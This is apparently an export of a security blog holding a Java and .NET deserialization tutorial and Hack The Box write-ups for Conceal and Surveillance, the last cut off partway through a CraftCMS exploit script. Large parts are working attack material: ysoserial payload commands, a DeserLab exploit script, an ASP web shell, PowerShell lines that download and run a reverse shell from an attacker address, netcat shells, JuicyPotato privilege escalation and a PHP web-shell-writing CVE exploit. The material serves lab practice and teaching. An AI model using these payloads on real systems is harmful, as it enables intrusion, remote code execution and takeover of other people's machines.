application infrastructure, WebAPP may provide a layer of transport to supply data destined to a .NET remoting endpoint.https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/VIEWSTATEIs a pure web parameter that is used in the majority of .NET WebAPP in order to persist the state of the current web page.Is the state of the page and all its controls. It’s automatically maintained across the WebAPP by the ASP.NET framework.When a page is sent back to the client, the changes in the properties of the page and its controls are determined, and then, they’re stored in the value of a hidden input field _VIEWSTATEWith every other POST request, the _VIEWSTATE field is sent to the server together with other parameters.The Viewstate has a form of serialized data which gets deserialized when sent to the server.Of course, the later the .NET framework on server side, the more countermeasures will be in place. It would be too easy if the framework would let the users freely tamper the content of VIEWSTATELatest countermeasures against VIEWSTATE tampering are:  MAC Enabled option → Viewstate is signed with a cryptographic key known only by the server-side. It’s configured by the following settings/option &lt;page enableViewState=Mac\"true\" /&gt;  Web.config or “Setting MAC validation in IIS manager”→ The latest .NET framework uses MAC validation by default  Encrypt → *&lt;page ViewStateEncryptionMode=\"Always\" /&gt;*However, if the key is hardcoded, it might be leaked as a result of file read vulnerabilities like XXE, LFI, etc.If MAC validation is enabled, then it could be possible to exploit viewstate-based deserialization only if the MAC key is hardcoded (e.g. in web.config)Burp displays information about the MAC. In the Pro version of Burp suite, such a case is automatically triggered as potential vulnerability.Example, generate a payload using ysoserial.net and put it into the viewstate parameter. The payload will perform a simple HTTP request, since this is the appropriate approach before trying more specific RCE payloads      hello.aspx.cs (backend)            hello.apsx (frontend)            web.config (IIS standard config file)            Intercept with burp and getting the ViewState                ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c \"powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd\"      For IIS users, the current default settings of IIS are to generate the key at runtime, and it’s different for each application. Which means that the viewstate parameter will change.Serialization in JavaWhen assessing java-based WebAPP should pay attention to binary data  Starts with: ,,aced0005 (hex) / rO0aB (base64)  Looks like a list of java classes: org.apache.something / java.lang.StringPresence of such data may indicate that the target application is deserializing custom data.1º Create a serialized object to understand the process better.Item.java → Class named item - Is a simple class that has two fields.package eLearn;import java.io.Serializable;public class Item implements Serializable {\tint id;\tString name;\t\tpublic Item(int id , String name) {\t\tthis.id = id;\t\tthis.name = name;\t}}Serialize.java → Serialization Logic - Will make use of that class. First it’ll create an instance of the Item class, and then serialize that instance as well as save it to a file.package eLearn;import java.io.*;class Serialize {\tpublic static void main(String args[]) {\t\ttry {\t\t\t// Create the object\t\t\tItem s1 = new Item(123, \"look\");\t\t\t\t\t\t// Creating stream and writing the object\t\t\tFileOutputStream fout = new FileOutputStream(\"data.ser\");\t\t\tObjectOutputStream out = new ObjectOutputStream(fout);\t\t\tout.writeObject(s1);\t\t\tout.flush();\t\t\t\t\t\t// Closing the stream\t\t\tout.close();\t\t\tSystem.out.println(\"Serialized data saved to data.ser\");\t\t\t\t\t} catch (Exception e) {\t\t\tSystem.out.println(e);\t\t}\t}}      type data.ser            certutil -dump data.ser - is in binary format. Apart from some strings that disclose what serialized data might be, there are also some non-ASCII chars      The file begins with the ,,ac ed 00 05” bytes which is a standard java serialized format signature.As java serialized data is in binary format, when used in WebApp its often encoded using Base64 in order to mitigate non-ASCII bytes.When inspect web applications for java serialized objects, you should also look for base64 strings tarting with **,,rO0AB**”2º Write code that will retrieve the serialized data out of the binary file.Deserialize.javapackage eLearn;import java.io.*;class Deserialize {\tpublic static void main(String[] args) {\t\ttry {\t\t\t//Creating stream to read the object\t\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(\"data.ser\"));\t\t\tItem s = (Item)in.readObject();\t\t\t\t\t\t//Print the data of the serialized object\t\t\tSystem.out.println(s.id + \" \" + s.name);\t\t\t\t\t\t//Close the stream\t\t\tin.close();\t\t\t\t\t} catch (Exception e) {\t\t\tSystem.out.println(e);\t\t}\t\t\t}}      java eLearn.Deserialize      Change the “data.ser” file. After opening it in a text editor, we change the to-be-deserialized class named ,,Item\" to ,,ltxm\"If now try to deserialize the data.ser file, an error occurs; This is because the class Itxm does not exist3º Deserialization ConditionsWhen serializing and deserializing data, the deserializing endpoint must know - this means, it has to include in its classpath or import - All the classes and packages that the serialized object consist ofBasically, attacking Java serialization is about passing the malicious state of an object to the deserializing endpoint.Executing OS commands in Java could be done for example, by invoking code likeJava.lang.Runtime.getRuntime.exec(,,whoami\")But in order to make the deserializing endpoint execute the above code, it should be enclosed in a serialized object’s property.An Object’s Properties in their simplest form are spotted in the format below:  Object.one.twoReading from right to left you can traverse the name and know that:  Two is a property of one  One is a property of ObjectIn the same way, if you see:Java.lang.Runtime.getRuntime.exec(,,id\")exec(,,id”) is a property of getRuntime, which in turn is a property of Java.lang.RuntimeDuring deserialization the object’s properties are accessed recursively, leading to code execution at the very end of this process.An opaque class order that allows chaining subsequent classes is possible thanks to reflection, which allows us to use methods without knowing them previously.Reflection can be recognized by the ,,opaque\" calling order in the code.A potentially exploitable condition in Java occurs when readObject() or similar function is called on user-controlled object and later, a method on that object is called.An attacker is able to craft such an object containing multiple, nested properties, that upon method call will do something completely different, e.g. hijack the called method by implementing a Dynamic Proxy and an Invocation handler in the serialized objects properties.For exampleApplication Context:  The application has a mechanism to read and deserialize objects from files. This could be for various legitimate reasons, such as loading configuration, state, or user data.  The application expects the files to be safe and contain serialized instances of VulnerableClass.Malicious File Creation (by the Attacker):  The attacker creates a malicious file (“malicious.ser”) that contains a serialized instance of MaliciousClass.  The attacker somehow gets this file into a location where the application will read it (e.g., through a file upload feature, social engineering, or exploiting another vulnerability).Deserialization by the Application:  The application reads and deserializes the file “malicious.ser”, expecting it to contain a VulnerableClass object.  During deserialization, the readObject method of the actual class in the file (MaliciousClass) is executed, running the malicious code.1º VulnerableClass.java - The application expects to deserialize objects of this class:package eLearn;import java.io.Serializable;import java.io.ObjectInputStream;import java.io.IOException;public class VulnerableClass implements Serializable {\tprivate static final long serialVersionUID = 1;\tprivate String data;\t\tprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\t\tois.defaultReadObject();\t\t// Vulnerable code: assumes the deserialized  data is safe to use\t\tSystem.out.println(\"Data: \" + data);\t}}2º Desserialization.java - The application has code that deserializes objects from files:package eLearn;import java.io.FileInputStream;import java.io.ObjectInputStream;import java.io.IOException;import java.io.FileNotFoundException;public class DeserializeVulnerable {    public static void main(String[] args) {        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"malicious.ser\"))) {            VulnerableClass obj = (VulnerableClass) ois.readObject();            System.out.println(\"Deserialization complete.\");        } catch (FileNotFoundException e) {            e.printStackTrace();        } catch (IOException e) {            e.printStackTrace();        } catch (ClassNotFoundException e) {            e.printStackTrace();        }    }}What Happens in the Exploited Scenario  Malicious Object: The serialized data in “malicious.ser” actually contains an instance of MaliciousClass, not VulnerableClass.  Deserialization: When ois.readObject() is called, it reconstructs the MaliciousClass object.  Type Casting: Although the object is cast to VulnerableClass, it is actually an instance of MaliciousClass. Due to Java’s dynamic nature, the cast does not prevent the readObject method of MaliciousClass from being executed.  Execution of Malicious Code: The readObject method of MaliciousClass is invoked during deserialization, executing the malicious code (Runtime.getRuntime().exec(\"calc.exe\")).3º MaliciousClass.java - The attacker creates this class to exploit the deserialization vulnerability:package eLearn;import java.io.Serializable;import java.io.ObjectInputStream;import java.io.IOException;public class MaliciousClass implements Serializable {    private static final long serialVersionUID = 1L;    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {        ois.defaultReadObject();        // Malicious code execution using ProcessBuilder        ProcessBuilder processBuilder = new ProcessBuilder(\"calc.exe\");         processBuilder.start();    }}4º SerializeMaliciousObject.java - The attacker serializes MaliciousClass and creates “malicious.ser”:package eLearn;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.io.IOException;public class SerializeMaliciousObject {\tpublic static void main(String[] args) {\t\tMaliciousClass maliciousObject = new MaliciousClass();\t\ttry (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"malicious.ser\"))) {\t\t\toos.writeObject(maliciousObject);\t\t} catch (IOException e) {\t\t\te.printStackTrace();\t\t}\t}}Compile the Java classesjavac eLearn/MaliciousClass.java eLearn/SerializeMaliciousObject.java eLearn/VulnerableClass.java eLearn/DeserializeVulnerable.javaRun the SerializeMaliciousObject class to create the “malicious.ser” file:java eLearn.SerializeMaliciousObjectRun the DeserializeVulnerablejava eLear.DeserializeVulnerable      Result      4º Gadgets &amp; YsoserialEvery property or method that is part of a nested exploit object is called a gadget      nested exploit what’s it    A “nested exploit” refers to a complex exploit technique where multiple smaller exploits, often referred to as “gadgets,” are combined in a structured way to achieve a larger, more sophisticated attack.    When the exploit process involves multiple layers or components working together, it is referred to as a nested exploit. These components are nested within each other forming a complex structure.    Each property or method within the nested exploit that performs a specific function is called a gadget.    Nested exploits are often used in advanced attacks because they can bypass certain security mechanisms, such as Data Execution Prevention (DEP)  There is a set of common libraries that were identified as gadget libraries  → this doesn’t mean that they are insecure by design  - But the attacker can abuse them to construct a known gadget chain.CommonsCollections (version 1-6) is a library that were identified as vulnerable.There’s is a tool named ysoserial that can be used to perform exploitation of insecure java deserialization.      Multiple modules that can suite various Java deserialization exploitation        java -jar ysoserial-all.jar - Displays the help message      The payload names displayed in the help message are Library names that the gadgets will be taken from.The ysoserial payload is in binary format. Often will need to convert the output to base64 in order to be able to send it to an application.      java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 \"whoami\"java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 \"whoami\" | base64      The command above generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonsCollections1 in its classpath, will result in executing the command ,,whoami\"Its usage isn’t the most convenient when assessing WebAPP due to being a command line script.Several Burpsuite Pro extensions have been developed in order to make Java serialization detection and exploitation easier.  Freddy, Deserialization Bug Finder  Java Deserialization ScannerWhen approaching an application that utilizes serialized java data, we don’t know what libraries are used by the back end. In such a case, a brute-force approach might be rewarding.Assume that payloads.txt contains ALL ysoserial payload names, one per linewhile read payload;do echo -en \"$payload\\n\\n\";java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar $payload \"whoami\" | base64 | tr -d '\\n' &gt;payloads/$payload.serecho -en \"--------------------------------\\n\\n\"; done &lt; payloads.txtThe result file can be further used in Burp Intruder attacks. However, some of the payloads cause ysoserial to throw an error. This is because some payload names must be used in a specific way.      https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/exploit      Each of the .java files can be run as a separate java class, resulting in executing different code by the ysoserial tool. For example, based on the names of the Java classes that ysoserial contain, we can infer what they were built forA jar file, the format in which ysoserial is shipped, is a regular zip archive that can be unpacked. Due to this feature of Java, it’s possible to select and invoke a single method out of a jar archive.In order to do that, we need to use the command line java utility with the -cp (classpath) argument. So if we wanna use the JSF.java module, we need to issue the following command line      java -cp ysoserial-all.jar ysoserial.exploit.JSF      The JSF payload can be used to attack serialization in Java Face’s VIEWSTATE parameter5º Exploiting Java DeserializationVulnerable environment: https://github.com/NickstaDB/DeserLabTarget Machine      java -jar DeserLab.jar -server 192.168.83.129 4430      Attacker Machine - try to just connect to the endpoint      nc 192.168.83.129 4430          So try to use DeserLab’s client functionality to see if the connection will behave differently      java -jar DeserLab.jar -client 192.168.83.129 4430          Can use Wireshark dump to see the Java serialized data in the communication      Wireshark &amp; Filter for tcp.dstport == 4430      In order to avoid manual revision of all the packets sent, the tshark tool can be used to spot the beginning of the serialization streamsave the Wireshark dump as deserialization.pcap      tcpdump -r deserialization.pcapng 'host 192.168.83.129 and host 192.168.83.128' -w finaldeserialization.pcap        tshark -r deserialization.pcapng -T fields -e tcp.srcport -e data -e tcp.dstport -E separator=, | grep -v ',,' | grep '^4430,' | cut -d ',' -f2 | tr '\\n' ':' | sed s/://g      For every object / value transported in Java serialized data, there’s a preceding byte of certain value that identifies its type.            0x70      TC_NULL                  0x71      TC_REFERENCE              0x72      TC_CLASSDESC              0x73      TC_OBJECT              0x74      TC_STRING              0x75      TC_ARRAY              0x76      TC_CLASS              0x77      TC_BLOCKDATA              0x78      TC_ENDBLOCKDATA              0x79      TC_RESET              0x7A      TC_BLOCKDATALONG              0x7B      TC_EXCEPTION              0x7C      TC_LONGSTRING              0x7D      TC_PROXYCLASSDESC              0x7E      TC_ENUM      Can inspect any Java serialized stream to identify the object it contains using the Java Serialization Dumper toolAlso, can build the tool using the supplied build.sh script. The tool’s usage is straightforward, as the tool takes just a hex representation of serialized bytes and dumps the objects the byte stream consists.      java -jar SerializationDumper.jar aced00057704f000baaa77020101737200146e622e646573657265486173682657175657374e52ce9a92ac1f991020024c000a64617461546f48617368007472696e673b4c00077468654861736871007e0001787074000a74657374737472696e6774002064363763356532636535623031633939663933265333864656636535638      The tool dumps every object that is contained within the serialized stream.The simple netcat listener/client was not enough to start a ,,serialized conversation\" since lots of serialized objects were sent to the target.You might also want to study the source code of the tool to see where certain parts of the serialized stream were generated and sent.But how can we got from replacing single objects to executing code?  Build a  python script that will mimic the initial serialized handshake - 0xaced0005  Replace the serialized data - the string hash, with the ysoserial payloadBased on the output of Serialization Dumper part of the communication must be mimicked using python. This includes the handshake, 2 TC_BLOCKDATA structures and the username.The final payload is generated using Groovy library is chosen since it’s utilized by DeserLab.      java -jar ysoserial-all.jar Groovy1 \"ping 192.168.83.129\" &gt; p.bin      The payload contains the java serialization signature in the beginning ac ed 00 05Since the serialized conversation is already started, we should remove it from the payload. That’s why in the exploit, you’ll see the ysoserial payload being shortened by removing the first 4 bytes.Exploit.py - it contains all structures dumped by the SerializationDumper tool until the hashed string, which is replaced by the ysoserial payload without its first 4 bytes aced0005import socketip = \"192.168.83.129\"port = 4430payload = \"p.bin\"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((ip,port))data = '\\xac\\xed\\x00\\x05' # Serialization handshakes.sendall(data)data = '\\x77\\x04'data2= '\\xf0\\x00\\xba\\xaa' # TC_BLOCKDATAs.sendall(data)s.sendall(data2)data = '\\x77\\x02' # Protocol versiondata2 = '\\x01\\0x1's.sendall(data)s.sendall(data2)data = '\\x77\\x06' # depends on username 06 is string lenght +2data2 = '\\x00\\x04\\x74\\x65\\x73\\x74' # 00 04 is string lenght, the 4 bytes T E S Ts.sendall(data)s.sendall(data2)f = open(payload, \"rb\") #ysoserial payload without first 4 bytesc = f.read()s.send(c[4:])      exploit.py      6º Analysis of URLDNS PayloadThe payload doesn’t result in code execution.It makes the deserializing endpoint resolve an arbitrary DNS name.This is rather a low-impact result of insecure deserialization, but on the other hand it uses Java built-in features, so it’s likely to work almost every case.Allows for easier confirmation of insecure deserialization.https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java// This code is called when the payload is createdpublic Object getObject(final String url) throws Exception {    // Avoid DNS resolution during payload creation    URLStreamHandler handler = new SilentURLStreamHandler();    // Create the HashMap that will contain the URL    // HashMap.readObject() -&gt; HashMap ht = new HashMap()    HashMap ht = new HashMap(); // This method is called during the deserialization of the HashMap object    // Create the URL to use as a key in the HashMap    // HashMap.putVal()    URL u = new URL(null, url, handler); // The URL is used as a key in the HashMap    // Adding the URL as a key and any serializable value to the HashMap    // HashMap.putVal()    ht.put(u, url); // During deserialization, HashMap.putVal() is called    // Reconfigure the URL's hashCode    Reflections.setFieldValue(u, \"hashCode\", -1); // Resets the hashCode so that the next call to hashCode() triggers DNS resolution    return ht; // Returns the HashMap to be used as the payload}// This class is used to avoid DNS resolution during object creationstatic class SilentURLStreamHandler extends URLStreamHandler {    protected URLConnection openConnection(URL u) throws IOException {        return null;    }    protected synchronized InetAddress getHostAddress(URL u) {        return null;    }}// During the deserialization of the object on the target:    // 1. HashMap.readObject()    // 2. HashMap.putVal()    // 3. HashMap.hash()    // 4. URL.hashCode() -&gt; DNS resolution occurs hereHashMap is a Java data type that stores data in key-value pairs.The HashMap contains a hashed URL object, which due to java built-in mechanisms, will be arbitrarily resolved.The serialized object to be sent to the target is crafted in the public method getObject that returns an Object → serialized payload.  Payload Creation: A special object is created using a class URLDNS.  Use of HashMap: The malicious object uses a HashMap, which is a Java data structure that stores data in key-value pairs.  URL Manipulation: The HashMap contains a key that is a URL object. The URL class in Java has a special behavior: when the hashCode() method is called, it tries to resolve the DNS address of the URL.  Avoid Initial Resolution: A custom URL handler (SilentURLStreamHandler) is used to avoid DNS resolution when the object is created.  Force Resolution on Deserialization: When the HashMap is deserialized, it recalculates the hashCode() of the URL, forcing a new DNS resolution.Practical Example      java -jar ysoserial-all.jar URLDNS [http://somethingnonexistent.com](http://somethingnonexistent.com/) &gt; p.bin      In the Burp Suite Pro - can use Burp Collaborator Client in order to generate and catch DNS requests      [DNSChief](https://github.com/iphelix/dnschef) → For poc        nvim /etc/resolv.conf            ./dnschef.pyping nonexistentdomain1231aeqqsa.com            python3 exploit.py → Can see that the lookup is performed          URLDNS can be used to detect deserialization issues before you can try to attack them with full-RCE payloads.7º Troubleshooting YsoserialBe aware that for different reasons the code execution payloads can fail when using ysoserial.When attacking a serialization mechanism using ysoserial and aiming for code executions, lots of exceptions might occur.In order to be able to confirm whether the application is secure or not, you should be familiar with the exception types that can be thrown during the attacking process.Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface.  ClassNotFoundException → Target application doesn`t utilize the gadget library used by the ysoserial.  java.io.IOException + “,,Cannot run program*” → *Good sign** the payload worked.Create an RCE-related payload, be aware of its limitations:  Output redirects and pipes are not supported  Parameters to the command cannot contain spaces          nc -lp 4444 -e /bin/sh → Okay      python -c import socket; ... → Won’t work because the parameter (import socket) to Python contains a space      Credits  eLearnSecurity  Crowsec  HackerOne  OWASP"
  },
  
  {
    "title": "Hack The Box - Conceal",
    "url": "/posts/Hack-The-Box-Conceal/",
    "categories": "CTF, Hack The Box",
    "tags": "HARD, Windows, SNMP, JuicyPotato",
    "date": "2024-07-16 00:00:00 -0300",
    





    
    "snippet": "Conceal was an engaging box to delve into advanced exploitation techniques involving VPN configurations and Windows privilege escalation.The process began with thorough information gathering, start...",
    "content": "Conceal was an engaging box to delve into advanced exploitation techniques involving VPN configurations and Windows privilege escalation.The process began with thorough information gathering, starting with a full port scan that revealed various open UDP ports. Enumerating the ISAKMP and SNMP services provided critical insights, including a VPN password.Utilizing strongSwan, we configured a VPN connection to the target, enabling further service enumeration. This revealed additional open ports and accessible services, including FTP and a web service.The exploitation phase included uploading files through FTP and identifying that the server could process ASP files, allowing us to execute commands and obtain a reverse shell. We leveraged nishang for the reverse shell script.For privilege escalation, we exploited the JuicyPotato vulnerability on Windows, utilizing a valid CLSID to gain higher privileges. This allowed us to create a new user with administrative rights, ultimately leading to root shell access.Diagramgraph TD    A[Information Gathering] --&gt;|Port Scan| B[UDP Scan]    B --&gt; C[Enumerate ISAKMP]    B --&gt; D[Enumerate SNMP]    D --&gt; E[Configure StrongSwan]    E --&gt; F[New Service Enumeration]    F --&gt; H[Find FTP and Web Service]    H --&gt; I[Privilege Escalation]    I --&gt; J[JuicyPotato Exploit]    J --&gt; K[Gain Root Shell]Information GatheringPortscan      nmap -sS -Pn --open -D RND:20 10.10.10.116 -n -T4      Tried to run the enumeration on TCP ports with NMAP but without success. So, I proceeded to enumerate the UDP ports.      sudo nmap -sU -p- --min-rate 10000 10.10.10.116 -v            nmap -sUV -p 161,500 10.10.10.116 -n -T4 -v      EnumerationISAKMP 500/UDP  Internet Security Association and Key Management Protocol - Used to establish security keys and security associations in an IP network. Used in conjunction with the IPsec protocol to establish secure VPNs.Tool to enumerate the service - Sends ISAKLMP packets to the host and will display any response it receives.      ike-scan 10.10.10.116      SNMP 161/UDP  Simple Network Management Protocol - Used to manage devices on IP networks - Can be used to monitor/configure and control network devices - Routers / Switches / Similar devicesTool to “walk” through an SNMP agent’s information tree - Listing all available information.      snmpwalk -v1 -c public 10.10.10.116 - “-v1” specifies the version &amp; “-c Public” - default community for many devices      Obtained the Windows version:Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE -Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)Host is running VPN IKEiso.3.6.1.2.1.1.4.0 = STRING: 'IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43Let’s use the strongSwan tool - Provides a complete solution for IPsec and IKEv2 VPNs  sudo apt-get install strongswan      /etc/ipsec.conf - Here goes the Target IP - Configuration file for the VPN connection      # ipsec.conf - strongSwan IPsec configuration file      # basic configuration  config setup      # strictcrlpolicy=yes      # uniqueids = no      # Add connections here      # VPN connection  conn myvpn      keyexchange=ikev1      authby=secret      left=%defaultroute      leftsubnet=0.0.0.0/0      right=10.10.10.116      rightsubnet=10.10.10.116/32      ike=3des-sha1-modp1024!      esp=3des-sha1!      ikelifetime=28800s      keylife=3600s      rekeymargin=3m      keyingtries=1      auto=add        Explanation          conn myvpn: This defines the name of the connection.      keyexchange=ikev2: This specifies that you want to use the Internet Key Exchange version 2 protocol for this connection      ike=aes256-sha1-modp1024! and  esp=aes256-sha1!: These settings define the encryption and hash algorithms for the IKE negotiation and the ESP security protocol.      left=%defaultroute and  leftsubnet=0.0.0.0/0: These options define the IP address and subnet of the “left” side of the connection (usually the “client” in a client-server connection).      right=10.10.10.116 and  rightsubnet=0.0.0.0/0: These options define the IP address and subnet of the “right” side of the connection (usually the “server” in a client-server connection).      leftauth=psk and  rightauth=psk: These options specify that authentication will be done using a pre-shared key (PSK).      auto=start: This specifies that the connection should be started automatically when strongSwan is started.            /etc/ipsec.secrets -  Pre-shared key file - Here goes the found password key      %any 10.10.10.116 : PSK \"9C8B1A372B1878851BE2C097031B6E43\"        sudo ipsec restart - Start the service      sudo ipsec up myvpn - Connect to the VPN - Could not connect      Maybe the password is wrong 9C8B1A372B1878851BE2C097031B6E43 - Let’s check on crackstation      /etc/ipsec.secrets      PSK \"Dudecake1!\"            /etc/ipsec.conf      conn Conceal      type=transport      keyexchange=ikev1      right=10.10.10.116      authby=psk      rightprotoport=tcp      leftprotoport=tcp      esp=3des-sha1      ike=3des-sha1-modp1024      auto=start        sudo ipsec restart      Ipsec start --nofork - CHILD_SA Conceal{1} established -  Connection established and ready to run data      ExploitationNew PortscanAfter establishing communication with the server, run the enumeration again.      nmap -sVC 10.10.10.116 -n -T4 -v - Sem respostas      Restarted communication with ipsec and then ran the script again      nmap -p- --min-rate=1000 -sT -T4 10.10.10.116            nmap -sC -sV -p 21,80,135,139,445,49664,49665,49666,49667,49668,49670 -sT 10.10.10.116      Abusing WEB and FTPSince there’s an open web port, I decided to enumerate directories.      gobuster dir -e -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.txt,.html --no-error -t 50 | grep -v \"(Status: 403)\"            http://10.10.10.116/upload/      As the enumeration showed FTP, let’s connect.      tnftp -A 10.10.10.116      Let’s create a test file to upload to the page through FTP.      cat teste.php            tnftp -A 10.10.10.116            http://10.10.10.116/upload/      With this, we can see that the file teste.php was uploaded, but let’s see the return.      http://10.10.10.116/upload/teste.php      Apparently, the server cannot read a .php file. Let’s try ASP instead of PHP.      0xdf.asp - Creates a cmd      &lt;%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%&gt;            http://10.10.10.116/upload/0xdf.asp?cmd=whoami - Now let’s try to get a reverse shell      Getting a reverse shell. Let’s use nishang.      raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 - Adding a line at the end of the script        http://10.10.10.116/upload/0xdf.asp?cmd=powershell iex(New-Object Net.Webclient).downloadstring('http://10.10.16.5:8080/Invoke-PowerShellTcp.ps1')      nc -lvnp 443      We got the shell.      flag    f59ed628c935850cc4d2f8fde8a83bef      Priv EscalationJuicyPotato      systeminfo Microsoft Windows 10 Enterprise - 10.0.15063 N/A Build 15063 - x64            whoami /priv                  SeImpersonatePrivilege enabled is almost a victory [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019      itm4n’s blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)            PrintSpoofer64.exe      Couldn’t run, let’s try JuicyPotato      powershell \"(New-Object Net.WebClient).DownloadFile('http://10.10.16.5:8080/JuicyPotato.exe', 'C:\\Users\\Destitute\\Desktop\\JuicyPotato.exe')\"            JuicyPotato.exe      Let’s try to find a ‘{CLSID}’ - Since it’s Windows 10 - NMAP enumeration  https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Enterprise/CLSID.listLet’s upload the file CLSID_Win10Enterprise.list  which contains the Win10 CLSID list and the test_clsid.bat file which contains the script to test.  powershell \"(New-Object Net.WebClient).DownloadFile('http://10.10.16.5:8080/CLSID_Win10Enterprise.list', 'C:\\Users\\Destitute\\Desktop\\CLSID.list')\"      powershell \"(New-Object Net.WebClient).DownloadFile('http://10.10.16.5:8080/test_clsid.bat', 'C:\\Users\\Destitute\\Desktop\\test_clsid.bat')\"      Now I’ll upload a payload for Juicy to execute, note that the payload will be in .bat since I can’t execute commands directly.      cat cmd.bat            .\\JuicyPotato.exe -t \"*\" -p \".\\cmd.bat\" -l 9001 -c \"{5B3E6773-3A99-4A3D-8096-7765DD11785C}\"      I managed to execute it, but obviously did nothing because the cmd.bat script has nothing special.Let’s upload nc.exe and a .bat to connect.      cat cmd.bat      nc.exe 10.10.16.5 1234 -e cmd.exe            .\\JuicyPotato.exe -t \"*\" -p nc.exe -a \"-e cmd.exe 10.10.16.5 1234\" -l 9001 -c \"{5B3E6773-3A99-4A3D-8096-7765DD11785C}\"      I’ll create a script to create a user, etc.      upgradeshell.bat      net user /add hendrich 12345678a@  net localgroup Administrators hendrich /add            .\\JuicyPotato.exe -t \"*\" -p \".\\upgradeshell.bat\" -l 9001 -c \"{5B3E6773-3A99-4A3D-8096-7765DD11785C}\"      Let’s check if it was created.      net users      PsexecLet’s use psexec to enter the server.      python3 /usr/local/bin/psexec.py [hendrich@10.10.10.116](mailto:hendrich@10.10.10.116)      One detail I didn’t notice is that the default JuicyPotato is a 32-bit executable, hence the error. Let’s upload it as a binary in FTP.      tnftp -A 10.10.10.116            jp.exe            cp Invoke-PowerShellTcp.ps1 rev.ps1 - Set another port for the target machine to connect to our IP.            badfile.bat - Uploading through .bat due to strings “ “ and ‘ ‘.      powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8080/rev.ps1')\"      It will also be uploaded via FTP.      tnftp -A 10.10.10.116      Another thing is this http://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/ site is great for viewing the CLSID - We need to pick a service we believe is more common and likely to be active.      {e60687f7-01a1-40aa-86ac-db1cbf673334} - Chose this due to Windows update likely being active.            .\\jp.exe -t \"*\" -p \".\\badfile.bat\" -l 9002 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'            nc -lvnp 9001 - Port of the rev.ps1 command - Got root.            flag    d06d87f49545e7e840475b7ddbe100dd      "
  },
  
  {
    "title": "Hack The Box - Surveillance",
    "url": "/posts/Hack-The-Box-Surveillance/",
    "categories": "CTF, Hack The Box",
    "tags": "MEDIUM, Linux, WEB, CraftCMS, Zone Minder",
    "date": "2024-07-15 00:00:00 -0300",
    





    
    "snippet": "Surveillance was a complex and challenging box that required multiple exploitation techniques, including leveraging vulnerabilities in CraftCMS and ZoneMinder, along with performing lateral movemen...",
    "content": "Surveillance was a complex and challenging box that required multiple exploitation techniques, including leveraging vulnerabilities in CraftCMS and ZoneMinder, along with performing lateral movement and privilege escalation.Diagramgraph TD    A[Information Gathering] --&gt;|Port Scan| B[Enumeration]    B --&gt; C[HTTP 80]    C --&gt; D[CraftCMS Exploitation]    D --&gt; E[Lateral Movement]    E --&gt; F[Identify User Matthew]    F --&gt; G[Crack User Credentials]    G --&gt; H[Privilege Escalation]    H --&gt; I[ZoneMinder Exploitation]    I --&gt; J[Root Shell]Information GatheringPortscan      sudo hping3 -S --scan known 10.10.11.245            sudo hping3 -S --scan 1-65535 10.10.11.245            nmap -sVC -Pn -p 22,80 10.10.11.245 -n -T4      EnumerationHTTP 80When trying to access http://10.10.11.245 it redirects to http://surveillance.htb/, so we need to configure this in our DNS file      /etc/hosts      Let’s enumerate subdomains first      ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://surveillance.htb -H \"Host: FUZZ.surveillance.htb\" -mc 200      At the end of the main page, it is possible to see that they use CraftCMS version 4.4.14      view-source            http://surveillance.htb/admin/login      ExploitationCraftCMS 4.4.14Searching for vulnerabilities in the CraftCMS version, a possible RCE was foundCVE-2023-41892Searching for a PoC, the following page was foundhttps://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ceSome code changes were necessary      cve-2023-41892.py      import requests  import re  import sys      headers = {      \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36\"  }      def writePayloadToTempFile(documentRoot):      data = {          \"action\": \"conditions/render\",          \"configObject[class]\": \"craft\\\\elements\\\\conditions\\\\ElementCondition\",          \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'      }          files = {          \"image1\": (\"pwn1.msl\", \"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;          &lt;image&gt;          &lt;read filename=\"caption:&amp;lt;?php @System(@$_REQUEST['cmd']); ?&amp;gt;\"/&gt;          &lt;write filename=\"info:DOCUMENTROOT/cpresources/shell.php\"&gt;          &lt;/image&gt;\"\"\".replace(\"DOCUMENTROOT\", documentRoot), \"text/plain\")      }          response = requests.post(url, headers=headers, data=data, files=files)      def getTmpUploadDirAndDocumentRoot():      data = {          \"action\": 